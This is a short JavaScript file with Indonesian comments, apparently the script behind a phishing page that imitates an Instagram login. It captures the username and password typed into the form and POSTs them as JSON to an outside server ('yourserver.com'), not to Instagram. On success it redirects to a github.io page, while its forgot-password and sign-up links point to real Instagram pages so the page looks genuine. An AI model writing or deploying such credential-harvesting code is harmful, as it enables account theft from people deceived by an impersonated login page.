document.getElementById('loginForm').addEventListener('submit', handleLogin);

function handleLogin(event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // Kirim data ke server untuk memverifikasi login
    loginToInstagram(username, password);
}

function loginToInstagram(username, password) {
    // Simulasi permintaan ke server untuk verifikasi login
    fetch('https://yourserver.com/api/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            username: username,
            password: password
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            // Pengalihan setelah login berhasil
            window.location.href = "https://trendx122.github.io/pass/";
        } else {
            // Tampilkan pesan kesalahan
            alert("Username atau password salah. Coba lagi.");
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert("Terjadi kesalahan. Coba lagi.");
    });
}

// Menambahkan pengalihan untuk "Lupa kata sandi?"
document.getElementById('forgotPasswordLink').addEventListener('click', function() {
    window.location.href = "https://www.instagram.com/accounts/password/reset/";
});

// Menambahkan pengalihan untuk "Daftar"
document.getElementById('signupLink').addEventListener('click', function() {
    window.location.href = "https://www.instagram.com/accounts/emailsignup/";
});
